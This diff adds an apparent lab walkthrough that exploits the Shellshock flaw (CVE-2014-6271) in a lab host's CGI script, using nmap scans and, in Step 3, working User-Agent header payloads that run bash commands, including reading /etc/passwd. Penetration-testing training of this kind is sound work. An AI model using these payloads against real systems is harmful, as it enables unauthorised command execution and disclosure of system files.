@@ -1,0 +1,94 @@
+Tools
+
+    Nmap
+    BurpSuite
+
+Step 1:
+┌──(root㉿INE)-[~]
+└─# nmap -sS -Pn -A -T5 demo.ine.local
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-01 23:31 IST
+Nmap scan report for demo.ine.local (192.181.3.3)
+Host is up (0.000055s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.6 ((Unix))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.6 (Unix)
+MAC Address: 02:42:C0:B5:03:03 (Unknown)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.05 ms demo.ine.local (192.181.3.3)
+
+┌──(root㉿INE)-[~]
+└─# curl demo.ine.local                                                                                                                                    
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body { 
+    background-image: url('static/images/background.jpg');
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    background-position: center; 
+}
+</style>
+        <script>
+           setInterval(function() { 
+                var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                        if (this.readyState == 4 && this.status == 200) {
+                                document.getElementById("output").innerHTML = this.responseText;
+                        }
+                };
+                xhttp.open("GET", "/gettime.cgi", true);
+                xhttp.send();
+            }, 1000);
+        </script>
+
+</head>
+<body>
+        <div style="position:fixed;top:67%;left:40%" id="output" ></div>
+</body>
+</html>
+
+Step 2: 
+┌──(root㉿INE)-[~]
+└─# nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local                                                          
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-01 23:39 IST
+Nmap scan report for demo.ine.local (192.181.3.3)
+Host is up (0.000027s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+| http-shellshock: 
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known
+|       as Shellshock. It seems the server is executing commands injected
+|       via malicious HTTP headers.
+|             
+|     Disclosure date: 2014-09-24
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+|       http://seclists.org/oss-sec/2014/q3/685
+|       http://www.openwall.com/lists/oss-security/2014/09/24/10
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+MAC Address: 02:42:C0:B5:03:03 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
+
+Step 3:
+User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'
+User-Agent: () { :; }; echo; echo; /bin/bash -c 'ps -ef'
+
